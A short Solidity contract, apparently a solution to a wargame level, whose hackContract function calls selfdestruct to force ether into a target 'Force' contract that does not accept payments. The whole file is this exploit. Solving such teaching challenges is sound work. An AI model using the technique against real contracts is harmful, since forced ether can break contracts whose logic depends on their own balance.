// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Force.sol";

contract AttackingForce {
    Force public force;

    constructor(address _force) payable {
        force = Force(_force);
    }

    function hackContract() external {
        
        // cast address to payable
        address payable addr = payable(address(force));
        selfdestruct(addr);
    }
}
